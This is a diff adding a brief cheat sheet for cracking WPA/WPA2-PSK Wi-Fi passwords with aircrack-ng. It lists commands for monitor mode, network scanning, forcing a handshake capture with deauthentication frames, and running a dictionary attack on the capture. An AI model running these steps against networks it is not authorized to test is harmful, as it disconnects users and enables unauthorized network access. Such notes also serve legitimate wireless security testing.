@@ -1,0 +1,16 @@
+aircrack-ng (and its associated utils) is a tool used to crack passwords of Wi-Fi networks using PSK encryption and WPA/WPA2 security
+all commands are executed in the terminal, there is no GUI
+
+Commands:
+sudo airmon-ng # shows the current device and its interface type
+sudo airmon-ng start <interface> # starts monitoring on the device and interface
+sudo airmon-ng check kill # kills conflicting processes
+
+sudo airodump-ng <interface-monitor> # scans and shows networks in range, includes bssid and channel data
+sudo airodump-ng -c <channel> -w <file> --bssid <bssid> <interface-monitor> # scans and shows devices and data like MAC addresses for the devices on the given network, also specifies the file to write captured 4-way handshake data to
+
+sudo aireplay-ng --deauth <interval> -a <bssid> <interface-monitor> # sends deauth to devices on network, allows the previous command to capture 4-way handshake data
+
+sudo aircrack-ng <file> -w <wordlist> # executes a dictionary attack on the hashes writen to the given file using the specified wordlist *
+* aircrack does not offer a rule engine, it tries the wordlist verbatim, for added rules use hashcat or johnTheRipper
+
